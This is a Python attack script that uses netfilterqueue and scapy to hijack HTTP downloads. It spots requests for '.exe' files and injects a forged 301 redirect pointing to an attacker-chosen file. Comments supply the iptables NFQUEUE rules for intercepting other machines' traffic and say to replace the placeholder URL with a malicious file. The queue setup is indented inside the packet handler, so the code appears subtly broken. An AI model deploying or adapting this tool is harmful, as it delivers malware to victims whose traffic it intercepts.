#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# use iptables to modifing routing rules to other computer use: 
# iptables -I FORWARD -j NFQUEUE --queue-num 0

# to test packets on local computer:
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0

# in the end use > iptables --flush
# TODO: use subprocess to do the iptables commands
# pip install netfilterqueue
# change the payload "google.com.br" for your malicius file
# TODO: set optparce, to put only the url of the malicius file

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] I found an .exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.google.com.br")

                packet.set_payload(str(modified_packet))

    packet.accept()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()